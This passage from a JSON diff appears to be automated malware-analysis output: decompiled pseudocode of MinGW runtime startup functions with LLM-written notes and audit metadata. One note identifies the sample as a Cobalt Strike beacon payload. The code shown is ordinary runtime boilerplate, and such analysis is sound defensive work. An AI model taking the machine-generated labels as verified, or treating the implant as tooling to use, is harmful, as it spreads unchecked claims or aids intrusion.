*/\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n/* WARNING: Type propagation algorithm not settling */\n\nvoid mark_section_writable(ulonglong param_1)\n\n{\n  int tmp_iVar1;\n  undefined4 tmp_uVar2;\n  ulonglong *puVar3;\n  longlong tmp_lVar4;\n  undefined4 *puVar5;\n  longlong tmp_lVar6;\n  ulonglong tmp_uVar7;\n  undefined8 tmp_uVar8;\n  uint tmp_uVar9;\n  undefined1 auStack_b0 [16];\n  ulonglong uStack_a0;\n  ulonglong uStack_98;\n  longlong lStack_90;\n  undefined8 local_48 [3];\n  undefined8 local_30;\n  \n  tmp_uVar7 = (ulonglong)maxSections;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  tmp_uVar9 = 0;\n  puVar3 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if ((*puVar3 <= param_1) && (param_1 < *puVar3 + (ulonglong)*(uint *)(puVar3[1] + 8))) {\n      return;\n    }\n    tmp_uVar9 = tmp_uVar9 + 1;\n    puVar3 = puVar3 + 5;\n  } while (tmp_uVar9 != maxSections);\n  do {\n    tmp_lVar4 = __mingw_GetSectionForAddress(param_1);\n    if (tmp_lVar4 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",param_1);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        uStack_a0 = param_1;\n        uStack_98 = tmp_uVar7;\n        lStack_90 = tmp_lVar4;\n        tmp_iVar1 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_b0 + -((longlong)tmp_iVar1 * 0x28 + 0xfU & -16);\n      }\n      return;\n    }\n    param_1 = tmp_uVar7 * 0x28;\n    puVar5 = (undefined4 *)(the_secs + param_1);\n    *(longlong *)(puVar5 + 8) = tmp_lVar4;\n    *puVar5 = 0;\n    tmp_lVar6 = _GetPEImageBase();\n    tmp_lVar6 = tmp_lVar6 + (ulonglong)*(uint *)(tmp_lVar4 + 0xc);\n    *(longlong *)(the_secs + 0x18 + param_1) = tmp_lVar6;\n    tmp_lVar6 = VirtualQuery(tmp_lVar6,local_48,0x30);\n    if (tmp_lVar6 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(tmp_lVar4 + 8),\n            *(undefined8 *)(the_secs + 0x18 + param_1));\n      goto LAB_140001ca2;\n    }\n    if (((local_24 - 4U & -5) == 0) || ((local_24 - 0x40U & -65) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    tmp_uVar8 = 0x40;\n    if (local_24 == 2) {\n      tmp_uVar8 = 4;\n    }\n    param_1 = param_1 + (longlong)the_secs;\n    *(undefined8 *)(param_1 + 8) = local_48[0];\n    *(undefined8 *)(param_1 + 0x10) = local_30;\n    tmp_iVar1 = VirtualProtect(local_48[0],local_30,tmp_uVar8,param_1);\n    if (tmp_iVar1 != 0) goto LAB_140001c1e;\n    tmp_uVar2 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",tmp_uVar2);\nLAB_140001c80:\n    tmp_uVar7 = 0;\n  } while( true );\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n/* WARNING: Type propagation algorithm not settling */\n\nvoid mark_section_writable(ulonglong param_1)\n\n{\n  int iVar1;\n  undefined4 uVar2;\n  ulonglong *puVar3;\n  longlong lVar4;\n  undefined4 *puVar5;\n  longlong lVar6;\n  ulonglong uVar7;\n  undefined8 uVar8;\n  uint uVar9;\n  undefined1 auStack_b0 [16];\n  ulonglong uStack_a0;\n  ulonglong uStack_98;\n  longlong lStack_90;\n  undefined8 local_48 [3];\n  undefined8 local_30;\n  int local_24;\n  \n  uVar7 = (ulonglong)maxSections;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  uVar9 = 0;\n  puVar3 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if ((*puVar3 <= param_1) && (param_1 < *puVar3 + (ulonglong)*(uint *)(puVar3[1] + 8))) {\n      return;\n    }\n    uVar9 = uVar9 + 1;\n    puVar3 = puVar3 + 5;\n  } while (uVar9 != maxSections);\n  do {\n    lVar4 = __mingw_GetSectionForAddress(param_1);\n    if (lVar4 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",param_1);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        uStack_a0 = param_1;\n        uStack_98 = uVar7;\n        lStack_90 = lVar4;\n        iVar1 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_b0 + -((longlong)iVar1 * 0x28 + 0xfU & 0xfffffffffffffff0);\n      }\n      return;\n    }\n    param_1 = uVar7 * 0x28;\n    puVar5 = (undefined4 *)(the_secs + param_1);\n    *(longlong *)(puVar5 + 8) = lVar4;\n    *puVar5 = 0;\n    lVar6 = _GetPEImageBase();\n    lVar6 = lVar6 + (ulonglong)*(uint *)(lVar4 + 0xc);\n    *(longlong *)(the_secs + 0x18 + param_1) = lVar6;\n    lVar6 = VirtualQuery(lVar6,local_48,0x30);\n    if (lVar6 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(lVar4 + 8),\n            *(undefined8 *)(the_secs + 0x18 + param_1));\n      goto LAB_140001ca2;\n    }\n    if (((local_24 - 4U & 0xfffffffb) == 0) || ((local_24 - 0x40U & 0xffffffbf) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    uVar8 = 0x40;\n    if (local_24 == 2) {\n      uVar8 = 4;\n    }\n    param_1 = param_1 + (longlong)the_secs;\n    *(undefined8 *)(param_1 + 8) = local_48[0];\n    *(undefined8 *)(param_1 + 0x10) = local_30;\n    iVar1 = VirtualProtect(local_48[0],local_30,uVar8,param_1);\n    if (iVar1 != 0) goto LAB_140001c1e;\n    uVar2 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",uVar2);\nLAB_140001c80:\n    uVar7 = 0;\n  } while( true );\n}\n\n"
+    },
+    {
+      "function_address": "5368716480",
+      "function_name": "_pei386_runtime_relocator",
+      "confidence": 0.95,
+      "parameters": [],
+      "return_type": "void",
+      "notes": "One-time initialization routine for the MinGW PE i386 runtime pseudo-relocator, invoked during C runtime startup (caller: __tmainCRTStartup). It retrieves the PE section count via __mingw_GetSectionCount, allocates a stack buffer for section metadata, and sets a one-time initialization flag to prevent re-execution. The associated pseudo-relocation range error string confirms this function is part of the PE relocation handling subsystem.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 6626,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-98592c5927e78082c2b34f64d78e4cd2.019fdf3ab55177b5b8a7a91e361f8783",
+        "system_fingerprint": null,
+        "prompt_tokens": 2039,
+        "completion_tokens": 1766,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _pei386_runtime_relocator(void)\n\n{\n  int tmp_iVar1;\n  undefined1 auStack_48 [16];\n  \n  if (was_init_0 == 0) {\n    was_init_0 = 1;\n    tmp_iVar1 = __mingw_GetSectionCount();\n    maxSections = 0;\n    the_secs = auStack_48 + -((longlong)tmp_iVar1 * 0x28 + 0xfU & -16);\n  }\n  return;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _pei386_runtime_relocator(void)\n\n{\n  int iVar1;\n  undefined1 auStack_48 [16];\n  \n  if (was_init_0 == 0) {\n    was_init_0 = 1;\n    iVar1 = __mingw_GetSectionCount();\n    maxSections = 0;\n    the_secs = auStack_48 + -((longlong)iVar1 * 0x28 + 0xfU & 0xfffffffffffffff0);\n  }\n  return;\n}\n\n"
+    },
+    {
+      "function_address": "5368713280",
+      "function_name": "__tmainCRTStartup",
+      "confidence": 0.95,
+      "parameters": [],
+      "return_type": "int",
+      "notes": "Standard MinGW C runtime startup routine for console applications using wide-character main (tmain). It initializes the C runtime environment, processes thread-local storage callbacks, parses command-line arguments, invokes the Cobalt Strike beacon's main function (cobalt_beacon_main at 0x1400025a0), and performs runtime cleanup before exiting. The function is called by standard CRT entry points WinMainCRTStartup and mainCRTStartup, confirming its role as the primary console application entry point for this MinGW-compiled payload.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 7473,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-b9ccc613d9de8e1e577383d8391f9389.019fdf3af0b17f2a85c6e21b35060f24",
+        "system_fingerprint": null,
+        "prompt_tokens": 2318,
+        "completion_tokens": 8455,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400013f5) */\n/* WARNING: Removing unreachable block (ram,0x0001400013ff) */\n\nulonglong __tmainCRTStartup(void)\n\n{\n  longlong tmp_lVar1;\n  uint tmp_uVar2;\n  longlong tmp_lVar3;\n  int tmp_iVar4;\n  size_t sVar5;\n  longlong tmp_lVar6;\n  undefined8 *puVar7;\n  ulonglong tmp_uVar8;\n  FILE *__stream;\n  undefined4 *puVar9;\n  undefined8 *puVar10;\n  void *__dest;\n  undefined8 *puVar11;\n  ulonglong tmp_uVar12;\n  longlong unaff_GS_OFFSET;\n  bool tmp_bVar13;\n  undefined4 local_4c [3];\n  \n  tmp_lVar1 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);\n  while( true ) {\n    tmp_lVar6 = 0;\n    LOCK();\n    tmp_bVar13 = __native_startup_lock == 0;\n    tmp_lVar3 = tmp_lVar1;\n    if (!tmp_bVar13) {\n      tmp_lVar6 = __native_startup_lock;\n      tmp_lVar3 = __native_startup_lock;\n    }\n    __native_startup_lock = tmp_lVar3;\n    UNLOCK();\n    if (tmp_bVar13) {\n      tmp_bVar13 = false;\n      goto LAB_14000108c;\n    }\n    if (tmp_lVar1 == tmp_lVar6) break;\n    Sleep(1000);\n  }\n  tmp_bVar13 = true;\nLAB_14000108c:\n  if (__native_startup_state != 1) {\n    if (__native_startup_state == 0) {\n      __native_startup_state = 1;\n      __stream = (FILE *)__acrt_iob_func(2);\n      setvbuf(__stream,(char *)0x0,4,0);\n      tmp_iVar4 = _crt_atexit(safe_flush);\n      if (tmp_iVar4 == 0) {\n        _pei386_runtime_relocator();\n        _set_invalid_parameter_handler(FUN_140001000);\n        _text();\n        __mingw_initltsdrot_force = 1;\n        __mingw_initltsdyn_force = 1;\n        __mingw_initltssuo_force = 1;\n        managedapp = 0;\n        if (__mingw_app_type != 0) goto LAB_140001378;\n        __set_app_type(1);\n        do {\n          puVar9 = (undefined4 *)__p__fmode();\n          *puVar9 = _fmode;\n          puVar9 = (undefined4 *)__p__commode();\n          *puVar9 = _commode;\n          tmp_iVar4 = _text();\n          if (-1 < tmp_iVar4) {\n            if (_MINGW_INSTALL_DEBUG_MATHERR == 1) {\n              __mingw_setusermatherr(_text);\n            }\n            if (__globallocalestatus == -1) {\n              _configthreadlocale(-1);\n            }\n            tmp_iVar4 = _initterm_e(&__xi_a,&__xi_z);\n            if (tmp_iVar4 != 0) goto LAB_140001419;\n            local_4c[0] = _newmode;\n            tmp_iVar4 = __getmainargs(&argc,&argv,&envp,_dowildcard,local_4c);\n            tmp_uVar2 = argc;\n            if (-1 < tmp_iVar4) {\n              tmp_uVar8 = (ulonglong)argc;\n              puVar10 = malloc((argc + 1) * 8);\n              puVar7 = argv;\n              if (puVar10 != (undefined8 *)0x0) {\n                puVar11 = puVar10;\n                if ((int)tmp_uVar2 < 1) {\nLAB_140001395:\n                  *puVar11 = 0;\n                  argv = puVar10;\n                  SetUnhandledExceptionFilter(cpp_unhandled_exception_filter);\n                  _initterm(&__xc_a,&__xc_z);\n                  __main();\n                  __native_startup_state = 2;\n                  goto LAB_1400010b5;\n                }\n                tmp_uVar12 = 1;\n                while( true ) {\n                  sVar5 = strlen((char *)puVar7[tmp_uVar12 - 1]);\n                  __dest = malloc(sVar5 + 1);\n                  puVar10[tmp_uVar12 - 1] = __dest;\n                  if (__dest == (void *)0x0) break;\n                  memcpy(__dest,(void *)puVar7[tmp_uVar12 - 1],sVar5 + 1);\n                  if (tmp_uVar8 == tmp_uVar12) {\n                    puVar11 = puVar10 + tmp_uVar8;\n                    goto LAB_140001395;\n                  }\n                  tmp_uVar12 = tmp_uVar12 + 1;\n                }\n              }\n            }\n          }\n          _amsg_exit(8);\nLAB_140001378:\n          __set_app_type(2);\n        } while( true );\n      }\n      abort();\nLAB_140001419:\n      tmp_uVar8 = _amsg_exit(10);\n    }\n    else {\n      has_cctor = 1;\nLAB_1400010b5:\n      if (!tmp_bVar13) {\n        LOCK();\n        __native_startup_lock = 0;\n        UNLOCK();\n      }\n      tls_callback_0(0,2,0);\n      puVar7 = (undefined8 *)__p___initenv();\n      tmp_uVar2 = argc;\n      *puVar7 = envp;\n      tmp_uVar8 = main(tmp_uVar2,argv);\n      if (managedapp != 0) {\n        if (has_cctor == 0) {\n          _cexit();\n          tmp_uVar8 = tmp_uVar8 & -1;\n        }\n        return tmp_uVar8;\n      }\n    }\n    exit((int)tmp_uVar8);\n  }\n  _amsg_exit(0x1f);\n  __mingw_app_type = 1;\n  tmp_uVar8 = __tmainCRTStartup();\n  return tmp_uVar8;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400013f5) */\n/* WARNING: Removing unreachable block (ram,0x0001400013ff) */\n\nulonglong __tmainCRTStartup(void)\n\n{\n  longlong lVar1;\n  uint uVar2;\n  longlong lVar3;\n  int iVar4;\n  size_t sVar5;\n  longlong lVar6;\n  undefined8 *puVar7;\n  ulonglong uVar8;\n  FILE *__stream;\n  undefined4 *puVar9;\n  undefined8 *puVar10;\n  void *__dest;\n  undefined8 *puVar11;\n  ulonglong uVar12;\n  longlong unaff_GS_OFFSET;\n  bool bVar13;\n  undefined4 local_4c [3];\n  \n  lVar1 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);\n  while( true ) {\n    lVar6 = 0;\n    LOCK();\n    bVar13 = __native_startup_lock == 0;\n    lVar3 = lVar1;\n    if (!bVar13) {\n      lVar6 = __native_startup_lock;\n      lVar3 = __native_startup_lock;\n    }\n    __native_startup_lock = lVar3;\n    UNLOCK();\n    if (bVar13) {\n      bVar13 = false;\n      goto LAB_14000108c;\n    }\n    if (lVar1 == lVar6) break;\n    Sleep(1000);\n  }\n  bVar13 = true;\nLAB_14000108c:\n  if (__native_startup_state != 1) {\n    if (__native_startup_state == 0) {\n      __native_startup_state = 1;\n      __stream = (FILE *)__acrt_iob_func(2);\n      setvbuf(__stream,(char *)0x0,4,0);\n      iVar4 = _crt_atexit(safe_flush);\n      if (iVar4 == 0) {\n        _pei386_runtime_relocator();\n        _set_invalid_parameter_handler(FUN_140001000);\n        _text();\n        __mingw_initltsdrot_force = 1;\n        __mingw_initltsdyn_force = 1;\n        __mingw_initltssuo_force = 1;\n        managedapp = 0;\n        if (__mingw_app_type != 0) goto LAB_140001378;\n        __set_app_type(1);\n        do {\n          puVar9 = (undefined4 *)__p__fmode();\n          *puVar9 = _fmode;\n          puVar9 = (undefined4 *)__p__commode();\n          *puVar9 = _commode;\n          iVar4 = _text();\n          if (-1 < iVar4) {\n            if (_MINGW_INSTALL_DEBUG_MATHERR == 1) {\n              __mingw_setusermatherr(_text);\n            }\n            if (__globallocalestatus == -1) {\n              _configthreadlocale(0xffffffff);\n            }\n            iVar4 = _initterm_e(&__xi_a,&__xi_z);\n            if (iVar4 != 0) goto LAB_140001419;\n            local_4c[0] = _newmode;\n            iVar4 = __getmainargs(&argc,&argv,&envp,_dowildcard,local_4c);\n            uVar2 = argc;\n            if (-1 < iVar4) {\n              uVar8 = (ulonglong)argc;\n              puVar10 = malloc((argc + 1) * 8);\n              puVar7 = argv;\n              if (puVar10 != (undefined8 *)0x0) {\n                puVar11 = puVar10;\n                if ((int)uVar2 < 1) {\nLAB_140001395:\n                  *puVar11 = 0;\n                  argv = puVar10;\n                  SetUnhandledExceptionFilter(cpp_unhandled_exception_filter);\n                  _initterm(&__xc_a,&__xc_z);\n                  __main();\n                  __native_startup_state = 2;\n                  goto LAB_1400010b5;\n                }\n                uVar12 = 1;\n                while( true ) {\n                  sVar5 = strlen((char *)puVar7[uVar12 - 1]);\n                  __dest = malloc(sVar5 + 1);\n                  puVar10[uVar12 - 1] = __dest;\n                  if (__dest == (void *)0x0) break;\n                  memcpy(__dest,(void *)puVar7[uVar12 - 1],sVar5 + 1);\n                  if (uVar8 == uVar12) {\n                    puVar11 = puVar10 + uVar8;\n                    goto LAB_140001395;\n                  }\n                  uVar12 = uVar12 + 1;\n                }\n              }\n            }\n          }\n          _amsg_exit(8);\nLAB_140001378:\n          __set_app_type(2);\n        } while( true );\n      }\n      abort();\nLAB_140001419:\n      uVar8 = _amsg_exit(10);\n    }\n    else {\n      has_cctor = 1;\nLAB_1400010b5:\n      if (!bVar13) {\n        LOCK();\n        __native_startup_lock = 0;\n        UNLOCK();\n      }\n      tls_callback_0(0,2,0);\n      puVar7 = (undefined8 *)__p___initenv();\n      uVar2 = argc;\n      *puVar7 = envp;\n      uVar8 = main(uVar2,argv);\n      if (managedapp != 0) {\n        if (has_cctor == 0) {\n          _cexit();\n          uVar8 = uVar8 & 0xffffffff;\n        }\n        return uVar8;\n      }\n    }\n    exit((int)uVar8);\n  }\n  _amsg_exit(0x1f);\n  __mingw_app_type = 1;\n  uVar8 = __tmainCRTStartup();\n  return uVar8;\n}\n\n"
+    },
+    {
+      "function_address": "5368714304",
+      "function_name": "win_main_crt_startup",
+      "confidence": 0.95,
+      "parameters": [],
+      "return_type": "void",
+      "notes": "Standard MinGW GUI application C runtime startup entry point. Sets the global __mingw_app_type to 1 to mark the process as a Windows subsystem (GUI) application, then calls __tmainCRTStartup to perform standard CRT initialization prior to invoking the application's WinMain function, which is present as a neighbor in the same address space.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 2719,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-8fbf513a4af6590a5e92a1e61b7fcc90.019fdf3bd8f7723494ebce32043d0be5",
+        "system_fingerprint": null,
+        "prompt_tokens": 784,
+        "completion_tokens": 1224,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nvoid WinMainCRTStartup(void)\n\n{\n  __mingw_app_type = 1;\n  __tmainCRTStartup();\n  return;\n}\n",
+      "raw_pseudocode": "\nvoid WinMainCRTStartup(void)\n\n{\n  __mingw_app_type = 1;\n  __tmainCRTStartup();\n  return;\n}\n\n"
+    },
+    {
+      "function_address": "5368714336",
+      "function_name": "main_crt_startup",
+      "confidence": 0.95,
+      "parameters": [],
+      "return_type": "void",
+      "notes": "Standard MinGW C runtime startup entry point for console applications. It sets the global __mingw_app_type to 0 to indicate a console application type, then delegates to the resolved internal __tmainCRTStartup function which handles standard CRT initialization and invokes the program's main entry point.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 2716,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-abfbdde7b9e503ab53cbc452f7c47fd8.019fdf3bd8c87e3f86477813cccfd459",
+        "system_fingerprint": null,
+        "prompt_tokens": 783,
+        "completion_tokens": 1112,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nvoid mainCRTStartup(void)\n\n{\n  __mingw_app_type = 0;\n  __tmainCRTStartup();\n  return;\n}\n",
+      "raw_pseudocode": "\nvoid mainCRTStartup(void)\n\n{\n  __mingw_app_type = 0;\n  __tmainCRTStartup();\n  return;\n}\n\n"
+    }
+  ],
+  "synthesis": {
+    "function_results": [
+      {
+        "function_address": "5368718448",
+        "function_name": "_find_pe_section_by_name",
+        "confidence": 0.95,
+        "parameters": [
+          {
+            "name": "section_name",
+            "type": "char *"
+          }
+        ],
+        "return_type": "IMAGE_SECTION_HEADER *",
